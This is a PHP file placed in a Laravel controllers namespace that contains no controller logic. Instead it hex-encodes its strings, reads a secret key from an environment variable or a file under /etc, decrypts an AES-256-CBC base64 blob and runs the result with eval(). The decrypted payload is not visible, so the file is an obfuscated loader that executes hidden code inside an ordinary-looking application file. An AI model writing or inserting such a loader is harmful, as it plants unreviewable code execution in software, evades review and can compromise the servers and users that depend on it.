<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jReYV/XHnHMOeJxDjMQr2w==');

$c=base64_decode(

'r6TYuNk4U0fZ4QLcbK32g0mFVkaG1BL4wB4cD5t975eYFJbYCDU+AHg2hMSSALyV0o81GPf0bVDR' .
'HSPTS2hhbI04qMhA45RFfd+B7HK/bpxJrtiMCWJjIBXgVnlql+14AMaZepoXgWCUdFwpcRU6EW7L' .
'2xGr911Ydxck4RNGKJRf+lCw3gMrGHH2pVB/b1hbROzhn+N7kYuPnfOXr0nv8JvpyysULlK+wMPh' .
'/+mect0='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

